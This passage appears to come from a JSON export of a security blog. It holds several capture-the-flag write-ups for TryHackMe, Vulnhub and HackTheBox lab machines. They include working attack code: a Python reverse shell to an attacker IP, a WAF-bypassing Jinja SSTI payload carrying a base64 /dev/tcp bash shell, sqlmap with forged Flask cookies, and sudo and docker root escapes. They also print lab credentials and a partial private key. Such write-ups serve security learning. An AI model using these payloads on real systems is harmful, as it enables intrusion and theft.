:\\n\\n![](Attachments/Pastedimage20211103141651.png)\\n\\n--\x3e SO let\'s do stegno on background image .\\n\\nBut we don\'t have passphrase so we have to brute force it !\\n\\n==> So i done that with `stegoseek` and found the passphrase as `admin` and found one file which contains the password of `holt`\\n\\n![](Attachments/Pastedimage20211103141755.png)\\n\\n`holt:fluffydog12@ninenine`\\n\\n--\x3e And i got the ssh shell !\\n\\n---\\n\\n## Privesc\\n\\n--\x3e when i done `sudo -l` i found that we can run `/bin/nano` as root so i found one command on gtfobins\\n\\n```bash\\nnano\\n^R^X\\nreset; sh 1>&0 2>&0\\n```\\n\\n--\x3e And we got the root shell !\\n\\n![](Attachments/Pastedimage20211103142356.png)\\n\\n---"},{"id":"bruteit","metadata":{"permalink":"/Cybernotes/blog/bruteit","source":"@site/blog/2022-02-27-BruteIt/Brute it.md","title":"THM Brute-it writeup","description":"Tryhackme brute-it machine writeup","date":"2022-02-27T00:00:00.000Z","formattedDate":"February 27, 2022","tags":[{"label":"john","permalink":"/Cybernotes/blog/tags/john"},{"label":"ssh2john","permalink":"/Cybernotes/blog/tags/ssh-2-john"}],"readingTime":1.215,"truncated":true,"authors":[{"name":"0xSH1V4M","title":"Author","url":"https://github.com/shivam1317","imageURL":"https://avatars.githubusercontent.com/u/70281451?v=4","key":"shivam"}],"frontMatter":{"title":"THM Brute-it writeup","description":"Tryhackme brute-it machine writeup","image":"https://tryhackme-images.s3.amazonaws.com/room-icons/e343e8b253b4efc14bf61236d457c923.jpg","slug":"bruteit","authors":["shivam"],"tags":["john","ssh2john"]},"prevItem":{"title":"THM Brooklyn writeup","permalink":"/Cybernotes/blog/Brooklyn"},"nextItem":{"title":"THM chillhack writeup","permalink":"/Cybernotes/blog/chillhack"}},"content":"Hello everyone,\\n\\nToday we are going to solve brute-it room from tryhackme. we will learn about brute force using john the ripper.\\n\\n![](https://tryhackme-images.s3.amazonaws.com/room-icons/e343e8b253b4efc14bf61236d457c923.jpg)\\n\\n\x3c!--truncate--\x3e\\n\\n## Nmap results\\n\\n```bash\\nPORT STATE SERVICE VERSION\\n22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\\n| ssh-hostkey:\\n| 2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)\\n| 256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)\\n|\\\\_ 256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)\\n80/tcp open http Apache httpd 2.4.29 ((Ubuntu))\\n|\\\\_http-server-header: Apache/2.4.29 (Ubuntu)\\n|\\\\_http-title: Apache2 Ubuntu Default Page: It works\\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\\n```\\n\\n---\\n\\n## gobuster results\\n\\n```c\\n[09:45:58] 301 -  314B  - /admin  ->  http://10.10.241.146/admin/\\n[09:46:12] 200 -   11KB - /index.html\\n[09:46:24] 403 -  278B  - /server-status\\n```\\n\\n---\\n\\n--\x3e found this in source code of /admin page\\n\\n![](Attachments/Pastedimage20210707094741.png)\\n\\n---\\n\\n## Brute force\\n\\n--\x3e found the id and password of login page\\n\\n![](Attachments/Pastedimage20210707095815.png)\\n\\n```c\\nadmin:xavier\\n```\\n\\n--\x3e found one flag and id_rsa key after logging in !\\n\\n![](Attachments/Pastedimage20210707100003.png)\\n\\n--\x3e but it\'s encrypted so Let\'s decrypt it using john\\n\\n---\\n\\n## SSH\\n\\n--\x3e after decrypting id_rsa key i found the passphrase **rockinroll** !\\n\\n![](Attachments/Pastedimage20210707100215.png)\\n\\n--\x3e and i got ssh shell !\\n\\n--\x3e Let\'s escale our privileges\\n\\n---\\n\\n## Privesc\\n\\n--\x3e i started with sudo -l and found that root can run **cat** command\\nso Let\'s try to read /etc/shadow file and we got the hash for root !\\n\\n![](Attachments/Pastedimage20210707100948.png)\\n\\n--\x3e Let\'s decrypt it using john !\\n\\n--\x3e and i found the root password using john !\\n\\n![](Attachments/Pastedimage20210707101455.png)\\n\\n--\x3e and i got root shell !\\n\\n---"},{"id":"chillhack","metadata":{"permalink":"/Cybernotes/blog/chillhack","source":"@site/blog/2022-02-27-chillHack/chillHack.md","title":"THM chillhack writeup","description":"writeup of chillhack room from Tryhackme","date":"2022-02-27T00:00:00.000Z","formattedDate":"February 27, 2022","tags":[{"label":"python3","permalink":"/Cybernotes/blog/tags/python-3"},{"label":"zip2john","permalink":"/Cybernotes/blog/tags/zip-2-john"},{"label":"docker","permalink":"/Cybernotes/blog/tags/docker"},{"label":"mysql","permalink":"/Cybernotes/blog/tags/mysql"}],"readingTime":4.6,"truncated":true,"authors":[{"name":"0xSH1V4M","title":"Author","url":"https://github.com/shivam1317","imageURL":"https://avatars.githubusercontent.com/u/70281451?v=4","key":"shivam"}],"frontMatter":{"title":"THM chillhack writeup","description":"writeup of chillhack room from Tryhackme","authors":["shivam"],"slug":"chillhack","image":"https://tryhackme-images.s3.amazonaws.com/room-icons/897a124df0a70ad86502193b83f46658.png","tags":["python3","zip2john","docker","mysql"]},"prevItem":{"title":"THM Brute-it writeup","permalink":"/Cybernotes/blog/bruteit"},"nextItem":{"title":"Vulnhub SAR-1 writeup","permalink":"/Cybernotes/blog/sar-1"}},"content":"Hello everyone,\\n\\nToday we are going to solve chillhack from tryhackme. we will learn about python3 reverse shell, ssh port forwarding,zip2john and docker group privilege escalation.\\n\\n![](https://tryhackme-images.s3.amazonaws.com/room-icons/897a124df0a70ad86502193b83f46658.png)\\n\\n\x3c!--truncate--\x3e\\n\\n## Nmap results\\n\\n```c\\nNmap scan report for 10.10.9.151 (10.10.9.151)\\nHost is up (0.19s latency).\\nNot shown: 997 closed ports\\nPORT   STATE SERVICE VERSION\\n21/tcp open  ftp     vsftpd 3.0.3\\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\\n|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt\\n| ftp-syst:\\n|   STAT:\\n| FTP server status:\\n|      Connected to ::ffff:10.9.2.206\\n|      Logged in as ftp\\n|      TYPE: ASCII\\n|      No session bandwidth limit\\n|      Session timeout in seconds is 300\\n|      Control connection is plain text\\n|      Data connections will be plain text\\n|      At session startup, client count was 3\\n|      vsFTPd 3.0.3 - secure, fast, stable\\n|_End of status\\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\\n| ssh-hostkey:\\n|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)\\n|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)\\n|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)\\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\\n|_http-server-header: Apache/2.4.29 (Ubuntu)\\n|_http-title: Game Info\\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\\n\\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\\nNmap done: 1 IP address (1 host up) scanned in 15.63 seconds\\n```\\n\\n---\\n\\n## Gobuster results\\n\\n```c\\n===============================================================\\n/.htaccess            (Status: 403) [Size: 276]\\n/.htpasswd            (Status: 403) [Size: 276]\\n/css                  (Status: 301) [Size: 308] [--\x3e http://10.10.9.151/css/]\\n/fonts                (Status: 301) [Size: 310] [--\x3e http://10.10.9.151/fonts/]\\n/images               (Status: 301) [Size: 311] [--\x3e http://10.10.9.151/images/]\\n/js                   (Status: 301) [Size: 307] [--\x3e http://10.10.9.151/js/]\\n/secret               (Status: 301) [Size: 311] [--\x3e http://10.10.9.151/secret/]\\n/server-status        (Status: 403) [Size: 276]\\n===============================================================\\n```\\n\\n---\\n\\n## FTP\\n\\n--\x3e Got the file named `notes.txt` in ftp\\n\\n```bash\\nAnurodh told me that there is some filtering on strings being put in the command -- Apaar\\n```\\n\\n---\\n\\n## Enumeration\\n\\n--\x3e I got this website on port 80\\n\\n![](Attachments/Pastedimage20211103080502.png)\\n\\n--\x3e After going to the `secret` directory i found one input and it was asking for command to execute. so i tried to do `id` and i got the results\\n\\n![](Attachments/Pastedimage20211103080408.png)\\n\\n--\x3e But it was filtering many commands so after some time i tried to do like `l\\\\s` and it got executed !\\n\\nand i found 2 files/directories in current directory.\\n\\n```bash\\nimages index.php\\n```\\n\\n--\x3e Now let\'s read the content of `index.php`\\n\\nAnd i found it using command `c\\\\at index.php`\\n\\n![](Attachments/Pastedimage20211103085318.png)\\n\\n--\x3e I tried with `bash` `php` and `python` shells but it didn\'t worked then at last i tried `python3` shell with python3 as `/usr/bin/python3` and it worked and i got the reverse shell !\\n\\n![](Attachments/Pastedimage20211103090732.png)\\n\\n==> Python shell :\\n\\n```bash\\nexport RHOST=\\"10.9.2.206\\";export RPORT=4444;/usr/bin/python3 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\\"RHOST\\"),int(os.getenv(\\"RPORT\\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\\"sh\\")\'\\n```\\n\\n---\\n\\n## User privesc\\n\\n--\x3e When i done `sudo -l` i found that i can run `helpline.sh` file as a user `apaar`\\n\\n`(apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh`\\n\\n--\x3e So let\'s run it with the command : `sudo -u apaar /home/apaar/.helpline.sh` and enter `/bin/bash` in every field and i got the shell of `apaar` user.\\n\\n![](Attachments/Pastedimage20211103112428.png)\\n\\n---\\n\\n## Anurodh\\n\\n--\x3e After some searching i found that there are 3 internal ports are running `9001` and `3306` so i done curl on both ports and found one customer portal on port `9001` but i don\'t know username and password to login.\\n\\n--\x3e Then i found the mysql password for `root` in `/var/www/files/index.php`\\n\\n![](Attachments/Pastedimage20211103114825.png)\\n\\n--\x3e Then i logged in using this creds : `root:!@m+her00+@db`\\n\\nAnd after that i got the password for user `anurodh` in `webportal` db.\\n\\n![](Attachments/Pastedimage20211103114944.png)\\n\\n```bash\\n+----+-----------+----------+-----------+----------------------------------+\\n| id | firstname | lastname | username  | password                         |\\n+----+-----------+----------+-----------+----------------------------------+\\n|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |\\n|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |\\n+----+-----------+----------+-----------+----------------------------------+\\n```\\n\\nAfter cracking :\\n\\n`anurodh:masterpassword`\\n\\n--\x3e Now let\'s try to login using ssh.\\n\\nBut it didn\'t worked so let\'s try to login on port `9001` using this creds.\\n\\n--\x3e but then i generated new ssh keys and entered the public keys in `autorized_keys` file and also i forwarded the port `9001`\\n\\n```bash\\nssh apaar@10.10.208.94 -i key -L 9001:localhost:9001\\n```\\n\\n--\x3e After that i went to the port `9001` and found one login page.\\n\\n![](Attachments/Pastedimage20211103132815.png)\\n\\n--\x3e We have the creds which we found in the database so let\'s login\\n\\nafter login i found this page :\\n\\n![](Attachments/Pastedimage20211103132915.png)\\n\\n--\x3e So it says `Look in the dark you will find your answer` but i can\'t find any dark thing here xD.\\n\\nso there must be anything with the image so Let\'s download the image and do some stegno.\\n\\n```bash\\nsteghide info hacker.jpeg\\n```\\n\\nI found one file called `backup.zip` in the image\\n\\n![](Attachments/Pastedimage20211103133301.png)\\n\\nlet\'s extract it\\n\\n```bash\\nsteghide extract -sf hacker.jpeg\\n```\\n\\n--\x3e But the file is asking for a passphrase so we have to find the passphrase for the zip file using `zip2john`\\n\\n```bash\\nzip2john backup.zip > converted\\njohn --wordlist=/usr/share/wordlists/rockyou.txt converted\\n```\\n\\n--\x3e And i found the passphrase `pass1word`\\n\\nAfter unzipping the file i got one file called `source_code.php` Let\'s read this file.\\n\\nand i got one base64 encoded password in the file\\n\\n![](Attachments/Pastedimage20211103133603.png)\\n\\n--\x3e And this password looks of `Anurodh` because of this code\\n\\n![](Attachments/Pastedimage20211103133654.png)\\n\\nAfter decoding the password i got this\\n\\n`anurodh:!d0ntKn0wmYp@ssw0rd`\\n\\n--\x3e Let\'s login on ssh !\\n\\nand we got ssh shell !\\n\\n---\\n\\n## Root\\n\\n--\x3e When i done `id` then i found that `docker` is a part of our group so i searched for `docker group privilege escalation` and i found this command on `gtfobins`\\n\\n```bash\\ndocker run -v /:/mnt --rm -it alpine chroot /mnt sh\\n```\\n\\n--\x3e and we got root shell !\\n\\n![](Attachments/Pastedimage20211103133902.png)"},{"id":"sar-1","metadata":{"permalink":"/Cybernotes/blog/sar-1","source":"@site/blog/2022-02-27-sar1/index.md","title":"Vulnhub SAR-1 writeup","description":"SAR-1 machine writeup from Vulnhub","date":"2022-02-27T00:00:00.000Z","formattedDate":"February 27, 2022","tags":[{"label":"RCE","permalink":"/Cybernotes/blog/tags/rce"},{"label":"crontab","permalink":"/Cybernotes/blog/tags/crontab"}],"readingTime":1.21,"truncated":true,"authors":[{"name":"0xSH1V4M","title":"Author","url":"https://github.com/shivam1317","imageURL":"https://avatars.githubusercontent.com/u/70281451?v=4","key":"shivam"}],"frontMatter":{"slug":"sar-1","title":"Vulnhub SAR-1 writeup","description":"SAR-1 machine writeup from Vulnhub","authors":["shivam"],"image":"/img/Vulnhub/SAR-1.png","tags":["RCE","crontab"]},"prevItem":{"title":"THM chillhack writeup","permalink":"/Cybernotes/blog/chillhack"},"nextItem":{"title":"HTB Spider writeup","permalink":"/Cybernotes/blog/spider"}},"content":"Hello everyone,\\n\\nToday we are going to solve SAR-1 machine from vulnhub. we will learn about sar2HTML RCE and crontabs.\\n\\n![](/img/Vulnhub/SAR-1.png)\\n\\n\x3c!--truncate--\x3e\\n\\n## basic Enumration\\n\\n--\x3e nmap results:\\n\\n```bash\\nPORT STATE SERVICE VERSION\\n80/tcp open http Apache httpd 2.4.29 ((Ubuntu))\\n|\\\\_http-server-header: Apache/2.4.29 (Ubuntu)\\n|\\\\_http-title: Apache2 Ubuntu Default Page: It works\\nMAC Address: 08:00:27:C8:DD:67 (Oracle VirtualBox virtual NIC)\\n```\\n\\n---\\n\\n--\x3e gobuster results:\\n\\n```bash\\n[08:18:06] 200 - 11KB - /index.html\\n[08:18:11] 200 - 94KB - /phpinfo.php\\n[08:18:14] 200 - 9B - /robots.txt\\n[08:18:15] 403 - 274B - /server-status\\n```\\n\\n---\\n\\n=> got this in robots.txt\\n\\n```\\nsar2HTML\\n```\\n\\n## sar2HTML\\n\\n--\x3e got this in http://10.0.2.16/sar2HTML\\n\\n![](Attachments/Pastedimage20210702082406.png)\\n\\n--\x3e searched for sar2HTML 3.2.1 version exploit and got this :\\n\\n![](Attachments/Pastedimage20210702082553.png)\\n\\n--\x3e used exploit and got remote code execution as _www-data_\\n\\n![](Attachments/Pastedimage20210702082943.png)\\n\\n---\\n\\n==> got reverse shell using python3 payload\\n\\n![](Attachments/Pastedimage20210702083137.png)\\n\\n--\x3e got user.txt in `/home/love/Desktop/user.txt`\\n\\n![](Attachments/Pastedimage20210702083502.png)\\n\\n---\\n\\n## privesc\\n\\n--\x3e found one cronjob which is running as a root at every 5 minutes of interval\\n\\n![](Attachments/Pastedimage20210702084459.png)\\n\\n==> so Let\'s try to change this file and try to get reverse shell !\\n\\n--\x3e i also found crontabs as a vulnrable so now i am 100% sure it\'s crontab exploitation!\\n\\n![](Attachments/Pastedimage20210702085258.png)\\n\\n--\x3e finally.sh file is executing another file which is write.sh\\n\\n![](Attachments/Pastedimage20210702085645.png)\\n\\n--\x3e so Let\'s read that file !\\n\\n--\x3e and i added netcat mkfifo reverse shell into it and after 5 minutes i got reverse shell as root !\\n\\n![](Attachments/Pastedimage20210702090247.png)\\n\\n---\x3e and we pwned the machine!"},{"id":"spider","metadata":{"permalink":"/Cybernotes/blog/spider","source":"@site/blog/2022-02-27-Spider/Spider.md","title":"HTB Spider writeup","description":"writeup of Spider box from Hackthebox","date":"2022-02-27T00:00:00.000Z","formattedDate":"February 27, 2022","tags":[{"label":"SSTI","permalink":"/Cybernotes/blog/tags/ssti"},{"label":"flask","permalink":"/Cybernotes/blog/tags/flask"},{"label":"flask-unsign","permalink":"/Cybernotes/blog/tags/flask-unsign"},{"label":"sqlmap","permalink":"/Cybernotes/blog/tags/sqlmap"},{"label":"xml","permalink":"/Cybernotes/blog/tags/xml"}],"readingTime":6.325,"truncated":true,"authors":[{"name":"0xSH1V4M","title":"Author","url":"https://github.com/shivam1317","imageURL":"https://avatars.githubusercontent.com/u/70281451?v=4","key":"shivam"}],"frontMatter":{"title":"HTB Spider writeup","description":"writeup of Spider box from Hackthebox","image":"https://0xdedinfosec.github.io/hackthebox/spider/spider.png","authors":["shivam"],"slug":"spider","tags":["SSTI","flask","flask-unsign","sqlmap","xml"]},"prevItem":{"title":"Vulnhub SAR-1 writeup","permalink":"/Cybernotes/blog/sar-1"},"nextItem":{"title":"Vulnhub troll-1 writeup","permalink":"/Cybernotes/blog/troll-1"}},"content":"Hello everyone,\\n\\nToday we are going to solve the spider machine from Hackthebox. we will learn about SSTI in flask,flask-unsign with cookies,dumping data with sqlmap and XML entity injection\\n\\n![](https://0xdedinfosec.github.io/hackthebox/spider/spider.png)\\n\\n\x3c!--truncate--\x3e\\n\\n## Nmap results\\n\\n```c\\nPORT   STATE SERVICE VERSION\\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\\n| ssh-hostkey:\\n|   2048 28:f1:61:28:01:63:29:6d:c5:03:6d:a9:f0:b0:66:61 (RSA)\\n|   256 3a:15:8c:cc:66:f4:9d:cb:ed:8a:1f:f9:d7:ab:d1:cc (ECDSA)\\n|_  256 a6:d4:0c:8e:5b:aa:3f:93:74:d6:a8:08:c9:52:39:09 (ED25519)\\n80/tcp open  http    nginx 1.14.0 (Ubuntu)\\n|_http-server-header: nginx/1.14.0 (Ubuntu)\\n|_http-title: Did not follow redirect to http://spider.htb/\\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\\n```\\n\\n--\x3e It\'s redirecting us to `spider.htb` so Let\'s add it in `/etc/hosts`\\n\\n--\x3e Got this website on port `80`\\n\\n![](Attachments/Pastedimage20211107063106.png)\\n\\n---\\n\\n## Gobuster results\\n\\n```c\\n===============================================================\\n/cart                 (Status: 500) [Size: 290]\\n/checkout             (Status: 500) [Size: 290]\\n/index                (Status: 500) [Size: 290]\\n/login                (Status: 200) [Size: 1832]\\n/logout               (Status: 302) [Size: 209] [--\x3e http://spider.htb/]\\n/main                 (Status: 500) [Size: 290]\\n/product-details      (Status: 308) [Size: 275] [--\x3e http://spider.htb/product-details/]\\n/register             (Status: 200) [Size: 2130]\\n/user                 (Status: 302) [Size: 219] [--\x3e http://spider.htb/login]\\n/view                 (Status: 302) [Size: 219] [--\x3e http://spider.htb/login]\\n===============================================================\\n2021/11/05 13:30:13 Finished\\n===============================================================\\n```\\n\\n---\\n\\n## Enumration\\n\\n--\x3e I tried to register with the username and password and then logged in . After that i saw that we can see the user info in `user information` tab and it\'s assigning unique `UUID` for each user.\\n\\n--\x3e I tried the basic SSTI payload `{{config}}` and registered with this name and found that we can see the config files.\\n\\n==> Note: Name must be smaller than 10 characters.\\n\\n```\\n<Config {\'ENV\': \'production\', \'DEBUG\': False, \'TESTING\': False, \'PROPAGATE_EXCEPTIONS\': None, \'PRESERVE_CONTEXT_ON_EXCEPTION\': None, \'SECRET_KEY\': \'Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942\', \'PERMANENT_SESSION_LIFETIME\': datetime.timedelta(31), \'USE_X_SENDFILE\': False, \'SERVER_NAME\': None, \'APPLICATION_ROOT\': \'/\', \'SESSION_COOKIE_NAME\': \'session\', \'SESSION_COOKIE_DOMAIN\': False, \'SESSION_COOKIE_PATH\': None, \'SESSION_COOKIE_HTTPONLY\': True, \'SESSION_COOKIE_SECURE\': False, \'SESSION_COOKIE_SAMESITE\': None, \'SESSION_REFRESH_EACH_REQUEST\': True, \'MAX_CONTENT_LENGTH\': None, \'SEND_FILE_MAX_AGE_DEFAULT\': datetime.timedelta(0, 43200), \'TRAP_BAD_REQUEST_ERRORS\': None, \'TRAP_HTTP_EXCEPTIONS\': False, \'EXPLAIN_TEMPLATE_LOADING\': False, \'PREFERRED_URL_SCHEME\': \'http\', \'JSON_AS_ASCII\': True, \'JSON_SORT_KEYS\': True, \'JSONIFY_PRETTYPRINT_REGULAR\': False, \'JSONIFY_MIMETYPE\': \'application/json\', \'TEMPLATES_AUTO_RELOAD\': None, \'MAX_COOKIE_SIZE\': 4093, \'RATELIMIT_ENABLED\': True, \'RATELIMIT_DEFAULTS_PER_METHOD\': False, \'RATELIMIT_SWALLOW_ERRORS\': False, \'RATELIMIT_HEADERS_ENABLED\': False, \'RATELIMIT_STORAGE_URL\': \'memory://\', \'RATELIMIT_STRATEGY\': \'fixed-window\', \'RATELIMIT_HEADER_RESET\': \'X-RateLimit-Reset\', \'RATELIMIT_HEADER_REMAINING\': \'X-RateLimit-Remaining\', \'RATELIMIT_HEADER_LIMIT\': \'X-RateLimit-Limit\', \'RATELIMIT_HEADER_RETRY_AFTER\': \'Retry-After\', \'UPLOAD_FOLDER\': \'static/uploads\'}>\\n```\\n\\n--\x3e I found the secret key in this file :\\n\\n```bash\\nSup3rUnpredictableK3yPleas3Leav3mdanfe12332942\\n```\\n\\n--\x3e After searching for the variables like `SESSION_COOKIE_SAMESITE`, `PERMANENT_SESSION_LIFETIME`,`RATELIMIT_HEADERS_ENABLED` i found that this website is using `flask` in backend.\\n\\n![](Attachments/Pastedimage20211107064501.png)\\n\\n--\x3e Cookies :\\n\\n```\\neyJjYXJ0X2l0ZW1zIjpbXSwidXVpZCI6ImNlNGQzYmI5LWIyZTktNDQwZi1iZWQ0LWRhMDliY2I5MzlmNiJ9.YYe9Ig.Vk7ey7efv0ElIaByDhNcfndwkWY\\n```\\n\\nAfter decoding :\\n\\n```json\\n{ \\"cart_items\\": [], \\"uuid\\": \\"ce4d3bb9-b2e9-440f-bed4-da09bcb939f6\\" }\\n```\\n\\n--\x3e Let\'s add something in cart and see the changes in the cookies\\n\\n```json\\n{ \\"cart_items\\": [\\"1\\"], \\"uuid\\": \\"ce4d3bb9-b2e9-440f-bed4-da09bcb939f6\\" }\\n```\\n\\nSo it\'s changing the cookies on interaction with cart\\n\\n## sqlmap\\n\\n--\x3e I found [this](https://book.hacktricks.xyz/pentesting/pentesting-web/flask) Blog but `flask-unsign` is not working in my system so i will continue with `sqlmap` command which you can find [here](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap#eval)\\n\\n```\\nsqlmap http://1.1.1.1/sqli --eval \\"from flask_unsign import session as s; session = s.sign({\'uid\': session}, secret=\'SecretExfilratedFromTheMachine\')\\" --cookie=\\"session=*\\" --dump\\n```\\n\\nLet\'s modify it\\n\\n```\\nsqlmap http://spider.htb/ --eval \\"from flask_unsign import session as s; session = s.sign({\'uuid\': session}, secret=\'Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942\')\\" --cookie=\\"session=*\\" --dump\\n```\\n\\n--\x3e After running the sqlmap i got these results :\\n\\n```bash\\nParameter: Cookie #1* ((custom) HEADER)\\n    Type: time-based blind\\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\\n    Payload: session=\' AND (SELECT 5244 FROM (SELECT(SLEEP(5)))JJSC) AND \'oNCX\'=\'oNCX\\n\\n    Type: UNION query\\n    Title: Generic UNION query (NULL) - 2 columns\\n    Payload: session=\' UNION ALL SELECT CONCAT(0x716b766b71,0x67664d595359566c6672695942626f6852685967434b53624f6b46744d654868624357724f477069,0x7162706a71)-- -\\n---\\n\\nDatabase: shop\\nTable: users\\n[5 entries]\\n+----+--------------------------------------+------------+-----------------+\\n| id | uuid                                 | name       | password        |\\n+----+--------------------------------------+------------+-----------------+\\n| 1  | 129f60ea-30cf-4065-afb9-6be45ad38b73 | chiv       | ch1VW4sHERE7331 |\\n| 2  | ce4d3bb9-b2e9-440f-bed4-da09bcb939f6 | {{config}} | hacker          |\\n| 3  | 0ef61829-d721-4fb7-b77d-1c822759b859 | hack       | hacker          |\\n| 4  | 8188a43e-e335-4904-b7e8-14adb9a746c7 | hecker     | hecker          |\\n| 5  | b5826318-5d52-48a8-981b-5d54baf52896 | {{config}} | {{config}}      |\\n+----+--------------------------------------+------------+-----------------+\\n\\nDatabase: shop\\nTable: messages\\n[1 entry]\\n+---------+---------+-----------------------------------------------------------------------------------+---------------------+\\n| post_id | creator | message                                                                           | timestamp           |\\n+---------+---------+-----------------------------------------------------------------------------------+---------------------+\\n| 1       | 1       | Fix the <b>/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal</b> portal! | 2020-04-24 15:02:41 |\\n+---------+---------+-----------------------------------------------------------------------------------+---------------------+\\n```\\n\\n## flask reverse shell\\n\\n--\x3e We got the password of `chiv` so Let\'s try to login as SSH\\n\\nBut it didn\'t worked :/\\n\\n--\x3e So then i tried to login with `UUID` and password on website and i got the admin panel.\\n\\n![](Attachments/Pastedimage20211107075253.png)\\n\\n--\x3e There is a one message in messages\\n\\n```bash\\nFix the /a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal portal!\\n```\\n\\nSo it might be some directory so let\'s go into this\\n\\nand it is generating the support ticket\\n\\n![](Attachments/Pastedimage20211107075443.png)\\n\\n--\x3e Then i tried to add `{{config}}` but WAF is filtering that so we have to find some payload which bypasses the WAF and i found one [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)\\n\\n```bash\\n{{request|attr(\'application\')|attr(\'\\\\x5f\\\\x5fglobals\\\\x5f\\\\x5f\')|attr(\'\\\\x5f\\\\x5fgetitem\\\\x5f\\\\x5f\')(\'\\\\x5f\\\\x5fbuiltins\\\\x5f\\\\x5f\')|attr(\'\\\\x5f\\\\x5fgetitem\\\\x5f\\\\x5f\')(\'\\\\x5f\\\\x5fimport\\\\x5f\\\\x5f\')(\'os\')|attr(\'popen\')(\\"id\\")|attr(\'read\')()}}\\n```\\n\\n--\x3e But i found that it\'s filtering the single quote `\'` also so let\'s try with double quote `\\"`\\n\\nNew payload :\\n\\n```bash\\n{% include request|attr(\\"application\\")|attr(\\"\\\\x5f\\\\x5fglobals\\\\x5f\\\\x5f\\")|attr(\\"\\\\x5f\\\\x5fgetitem\\\\x5f\\\\x5f\\")(\\"\\\\x5f\\\\x5fbuiltins\\\\x5f\\\\x5f\\")|attr(\\"\\\\x5f\\\\x5fgetitem\\\\x5f\\\\x5f\\")(\\"\\\\x5f\\\\x5fimport\\\\x5f\\\\x5f\\")(\\"os\\")|attr(\\"popen\\")(\\"sleep 5\\")|attr(\\"read\\")()%}\\n```\\n\\n#### Why we used include and % ?\\n\\nget your answer [here](https://pythonprogramming.net/flask-includes-tutorial/)\\n\\n--\x3e And we got 5 seconds sleep !\\n\\n--\x3e So let\'s get the reverse shell using this payload .\\n\\nBut we need to `base64 encode` the reverse shell because it\'s not working directly because of special characters\\n\\nSo now our payload looks like this\\n\\n```bash\\n{% include request|attr(\\"application\\")|attr(\\"\\\\x5f\\\\x5fglobals\\\\x5f\\\\x5f\\")|attr(\\"\\\\x5f\\\\x5fgetitem\\\\x5f\\\\x5f\\")(\\"\\\\x5f\\\\x5fbuiltins\\\\x5f\\\\x5f\\")|attr(\\"\\\\x5f\\\\x5fgetitem\\\\x5f\\\\x5f\\")(\\"\\\\x5f\\\\x5fimport\\\\x5f\\\\x5f\\")(\\"os\\")|attr(\\"popen\\")(\\"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy4xNjIvNjk2OSAwPiYxCg== | base64 -d | bash\\n\\")|attr(\\"read\\")()%}\\n```\\n\\n--\x3e we need to url encode this also\\n\\n--\x3e And i got the reverse shell and `user` flag\\n\\nI also got the ssh key for chiv\\n\\n```bash\\n-----BEGIN RSA PRIVATE KEY-----\\nMIIEpAIBAAKCAQEAmGvQ3kClVX7pOTDIdNTsQ5EzQl+ZLbpRwDgicM4RuWDvDqjV\\ngjWRBF5B75h/aXjIwUnMXA7XimrfoudDzjynegpGDZL2LHLsVnTkYwDq+o/MnkpS\\nU7tVc2i/LtGvrobrzNRFX8taAOQ561iH9xnR2pPGwHSF1/rHQqaikl9t85ESdrp9\\nMI+JsgXF4qwdo/zrgxGdcOa7zq6zlnwYlY2zPZZjHYxrrwbJiD7H2pQNiegBQgu7\\nBLRlsGclItrZB+p4w6pi0ak8NcoKVdeOLpQq0i58vXUCGqtp9iRA0UGv3xmHakM2\\nVTZrVb7Q0g5DGbEXcIW9oowFXD2ufo2WPXym0QIDAQABAoIBAH4cNqStOB6U8sKu\\n6ixAP3toF9FC56o+DoXL7DMJTQDkgubOKlmhmGrU0hk7Q7Awj2nddYh1f0C3THGs\\nhx2MccU32t5ASg5cx86AyLZhfAn0EIinVZaR2RG0CPrj40ezukWvG/c2eTFjo8hl\\nZ5m7czY2LqvtvRAGHfe3h6sz6fUrPAkwLTl6FCnXL1kCEUIpKaq5wKS1xDHma3Pc\\nXVQU8a7FwiqCiRRI+GqJMY0+uq8/iao20jF+aChGu2cAP78KAyQU4NIsKNnewIrq\\n54dWOw8lwOXp2ndmo3FdOfjm1SMNYtB5yvPR9enbu3wkX94fC/NS9OqLLMzZfYFy\\nf0EMoUECgYEAxuNi/9sNNJ6UaTlZTsn6Z8X/i4AKVFgUGw4sYzswWPC4oJTDDB62\\nnKr2o33or9dTVdWki1jI41hJCczx2gRqCGtu0yO3JaCNY5bCA338YymdVkphR9TL\\nj0UOJ1vHU06RFuD28orK+w0b+gVanQIiz/o57xZ1sVNaNOyJUlsenh8CgYEA